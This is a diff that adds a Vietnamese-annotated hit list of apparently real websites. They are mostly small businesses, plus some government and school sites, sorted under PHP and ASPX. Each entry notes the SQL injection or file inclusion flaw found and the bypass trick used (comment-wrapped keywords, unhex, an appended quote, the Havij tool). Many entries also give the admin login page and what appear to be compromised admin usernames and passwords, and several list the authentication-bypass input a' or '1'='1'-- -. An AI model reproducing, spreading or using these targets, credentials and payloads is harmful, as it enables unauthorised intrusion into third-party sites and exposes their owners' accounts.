@@ -1,0 +1,62 @@
+									PHP
+http://tuhungstone.com/product.php?id=10 (havij)
+http://www.lixco.com/tintuc.php?id=158 (order by 11) (Bypass voi cap the /*!code*/)
+http://www.nguyenvantoc.com/danh-sach-dong-gop.php?m_id=28 (ByPass voi cap the /*!code*/)
+http://nhomkinhtanvietphat.com/chitietsanpham.php?id=60 (Havij)
+http://satthepducthinh.com/chitietsanpham.php?id=2 (order by 13) 
+http://cokhihieuphat.com/vn/chitietsanpham.php?pages=sanpham&id=90 (order by 15)
+http://cannhadep.com/service.php?id=461
+http://hamu.com.cn/webpage/The_news.php?id=1231728659
+http://www.igarsystem.com/cgi-bin/shop/index.cgi?page= (loi LFI)
+http://trungtamsuaghemassage.com/suachua_baotri/dich-vu-sua-chua/9.html#.U-D6fWNufIU (Loi SQL Injection dang HTML)
+http://ialyhpc.vn/?php=about&basic=detail&id=34 (Loi SQL Injection)
+http://www.hoangphucthinh.com/index.php?option=com_products&cid=14&view=article&task=detail&Itemid=2
+http://www.leban.com.vn/admin/ (Username:admin/Password:hiaz165)
+http://datlanh.com.vn/admin/   (Username:datlanh/Password:tdmk260988)
+http://www.nhuaphucthinh.com.vn/product.php?id=20
+http://vanphuthanh.vn/productdetail.php?id_menu=27&id_sp=47
+http://xenanghuynhgia.com/chitietsanpham.php?id=60
+http://thepvietduc.vn/tin-tuc.php?id=2
+http://www.baovelamhong.com/tin-tuc.php?id=9
+http://cokhinamtien.com/tin-tuc.php?id=2 
+http://nhahatquandoi.com/old/chi-tiet-tin-tuc.php?id=67
+http://laurier.com.vn/chi-tiet.php?id=885 (Link Admin:http://laurier.com.vn/cms_admin/login.php)
+http://www.sachthamkhao.vn/chi-tiet.php?id=14
+http://www.networkviet.com/chi-tiet-san-pham.php?masp=1948 (su dung unhex de Bypass)
+http://designtitc.com/dichvu.php?id=199
+http://viendongaudio.net/chi-tiet-tin-tuc.php?id=1 (bypass voi cap the /*!code*/ ket hop voi unhex(hex) )
+http://hoiyhoc.byethost24.com/tin-tuc.php?id=6' (Phai them dau ' vao sau id roi truy van de xuat hien loi)
+http://www.bongvietnam.com.vn/news.php?id=45 (Phai them dau ' vao sau id (VD:45') de xuat hien loi ket hop voi unhex(hex))
+	 (Link Admin:http://www.bongvietnam.com.vn/administration/ (Username:admin/password:admin) )
+http://www.cokhinguyentan.com/chitietsanpham.php?id=32' (Link Admin:http://www.cokhinguyentan.com/admin/ (User:Admin/Pass:123qwe)
+http://www.baobihainam.com/chitietsanpham.php?id=96 (Link Admin:http://www.baobihainam.com/admin/ (Username:admin/Password:hainam6716)
+http://ruoungoaigiasi.net/vn/chitietsanpham.php?id=42 (Link Admin:http://ruoungoaigiasi.net/admin/ (Username:admin/Password:ruou123)
+http://toctruonglonghoi.vn/xem-thong-tin.php?id=17
+http://nuoiranmoi.com.vn/chi-tiet-thu-vien-anh.php?id=1 (Link Admin: http://nuoiranmoi.com.vn/admin/ (Username:admin/Password:5555556A@ab)
+http://caodangsuphamcaobang.edu.vn/index.php?option=detail&alias=lich-cong-tac-tuan-06-nam-hoc-2014-2015&id=1003
+lmhtxphutho.org.vn/index.php?module=chi-tiet-tin&id=299
+fuaco.com.vn/noi-that-furniture-kinh-an-toan-glass-xay-dung.php?id_news=364
+chogo24h.com/sanpham.php?id=49#Ban-ghe-khach
+
+-------------------------------------------------------------------------------------------
+								ASPX
+http://yenninhthuan.com.vn/SanPham.aspx?id=4 (Loi ASPX) (Link Admin http://yenninhthuan.com.vn/ad/login.aspx)
+http://vinacemaco.com/site/sanpham.aspx?ID=8 (Loi ASPX) (Link Admin http://vinacemaco.com/site/admin/login.aspx)
+http://nchla.org/docdisplay.asp?ID=news (Magic Convert)
+http://www.quochoa.com.vn/sanpham.aspx?id=SP008
+http://sisiovietnam.com/chitiet.aspx?id=2 (Username:tongcongty/Password:tuanhoaan)(http://sisiovietnam.com/admin/dangnhap.aspx)
+http://tndvn.com/en/chitiet.aspx?id=12 (Link Administrator:http://tndvn.com/admin/login.aspx)(Username:Admin/Pass:123456)
+http://thuyloinamhatinh.vn/Admin/Login.asp (Bypass nhu sau: Username=a' or '1'='1'-- -) 
+http://www.tudonghoathaibinh.com/admin (Username/Password: a' or '1'='1'-- -)
+http://www.inoxtoanthinh.com/san-pham-chi-tiet.aspx?id=68
+http://aocuoithuonghai.com/GioiThieu.aspx?Id=6 (http://aocuoithuonghai.com/admin/login.aspx) (Username/Password:admin/abcde@12345)
+http://muabanthaibinh.com/admin (Username: a' or '1'='1'-- -)
+http://www.saigonroyal.com.vn/services.aspx?id=3
+http://songhinh.phuyen.gov.vn/front/News.aspx?id=295 (Link dang nhap: http://songhinh.phuyen.gov.vn/login.aspx)
+http://www.clc-mis.edu.vn/Thongbao.aspx?ID=3665 (Link Admin: http://www.clc-mis.edu.vn/login.aspx (Username/Password: Admin/ctvc1071A)
+
+
+
+
+
+
